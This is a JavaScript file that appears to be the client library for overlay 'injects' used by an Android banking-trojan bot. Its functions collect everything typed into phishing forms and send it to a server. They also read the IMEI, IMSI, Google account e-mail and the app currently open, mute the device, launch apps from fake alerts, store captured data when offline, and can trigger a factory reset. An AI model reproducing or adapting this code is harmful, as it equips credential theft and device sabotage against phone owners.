
/* Closes window of inject */

function closeWindow() {
	if (isAndroid() && typeof(Android.closeWindow) == 'function') {
		Android.closeWindow();
	} else {
		functionIsNotDefined('closeWindow');
	}
}

/* Executes factory reset of device */

function factoryReset() {
	if (isAndroid() && typeof(Android.factoryReset) == 'function') {
		Android.factoryReset();
	} else {
		functionIsNotDefined('factoryReset');
	}
}

/* Transmits data to server */

function transmit(stepID, form, closeInject, additionalData) {
	var o = {};
	var result = true;
	var m = $('#' + form).serializeArray();
	var a = (additionalData) ? m.concat(additionalData) : m;
	
	$.each(a, function() {
		var thisValue = this.value.trim();
		if (thisValue == '') {
			result = false;
			return false;
		}
		
		if (o[this.name] !== undefined) {
			if (!o[this.name].push) {
				o[this.name] = [o[this.name]];
			}
			o[this.name].push(thisValue || '');
		} else {
			o[this.name] = thisValue || '';
		}
	});
	
	if (!result) {
		return false;
	}
	
	o['stepID'] = stepID;
	
	if (isAndroid() && typeof(Android.sendDataToServer) == 'function') {
		Android.sendDataToServer(JSON.stringify(o), closeInject);
	} else {
		console.log(JSON.stringify(o));
	}
	
	return true;
}

/* Write to console if argument function is not defined */

function functionIsNotDefined(func) {
	console.log('Android.' + func + '() was called');
}

/* Returns ISO XX code of current country */

function getCountryCode() {
	if (isAndroid() && typeof(Android.getCountryCode) == 'function') {
		return Android.getCountryCode();
	} else {
		functionIsNotDefined('getCountryCode');
		return "gb";
	}
}

/* Returns manufacturer of device */

function getDeviceBrand() {
	if (isAndroid() && typeof(Android.getDeviceBrand) == 'function') {
		return Android.getDeviceBrand();
	} else {
		functionIsNotDefined('getDeviceBrand');
		return "";
	}
}

/* Returns model of device */

function getDeviceModel() {
	if (isAndroid() && typeof(Android.getDeviceModel) == 'function') {
		return Android.getDeviceModel();
	} else {
		functionIsNotDefined('getDeviceModel');
		return "";
	}
}

/* Returns Google Account (E-mail address) */

function getGoogleAccount() {
	if (isAndroid() && typeof(Android.getGoogleAccount) == 'function') {
		return Android.getGoogleAccount();
	} else {
		functionIsNotDefined('getGoogleAccount');
		return "";
	}
}

/* Returns IMEI code of device */

function getImei() {
	if (isAndroid() && typeof(Android.getImei) == 'function') {
		return Android.getImei();
	} else {
		functionIsNotDefined('getImei');
		return 0;
	}
}

/* Returns IMSI code of device */

function getImsi() {
	if (isAndroid() && typeof(Android.getImsi) == 'function') {
		return Android.getImsi();
	} else {
		functionIsNotDefined('getImsi');
		return 0;
	}
}

/* Returns ISO XX language code of current country */

function getLanguageCode() {
	if (isAndroid() && typeof(Android.getLanguageCode) == 'function') {
		return Android.getLanguageCode();
	} else {
		functionIsNotDefined('getLanguageCode');
		return "en";
	}
}

/* Returns package name of current opened application */

function getPackageName() {
	if (isAndroid() && typeof(Android.getPackageName) == 'function') {
		return Android.getPackageName();
	} else {
		functionIsNotDefined('getPackageName');
		return "";
	}
}

/* Returns current version of SDK */

function getVersionSdk() {
	if (isAndroid() && typeof(Android.getVersionSdk) == 'function') {
		return Android.getVersionSdk();
	} else {
		functionIsNotDefined('getVersionSdk');
		return 0;
	}
}

/* Return whether Android is defined */

function isAndroid() {
	return typeof Android != 'undefined';
}

/* Mute everything volume */

function muteVolume(state) {
	if (isAndroid() && typeof(Android.muteVolume) == 'function') {
		Android.muteVolume(state);
	} else {
		functionIsNotDefined('muteVolume');
	}
}

/*
 * Shows message in dialog window
 * If @packageName is not empty bot will start @packageName
 */

function showAlert(title, message, buttonText, packageName) {
	if (isAndroid() && typeof(Android.alert) == 'function') {
		Android.alert(title, message, buttonText, packageName);
	} else {
		alert(message);
	}
}

/* Shows error if server did not answer */

function showInternetError() {
	if (isAndroid() && typeof(Android.saveFailInject) == 'function') {
		Android.saveFailInject(); // Saves inject's data in memory of device
	} else {
		functionIsNotDefined('saveFailInject');
	}
	
	$('#cat-forms').hide();
	$('#cat-error').show();
}

/* Sends form with step's number stepID and shows form stepID + 1 */

function switchStep(stepID, regReceiver) {
	
	if (transmit(stepID, regReceiver)) {
	
		if (stepID == 1) {
			$('.cat-start-step').hide();
		}
		
		$('.cat-step-block').hide();
		$('#cat-step-' + (stepID + 1)).show();
		
	} else {
		showAlert('Error', 'You must fill out every field', 'OK', '')
	}
}

/* Hides block with error and shows form for enter inject's data */

function tryEnterAgain() {
	
	$('#cat-error').hide();
	$('#cat-forms').show();
}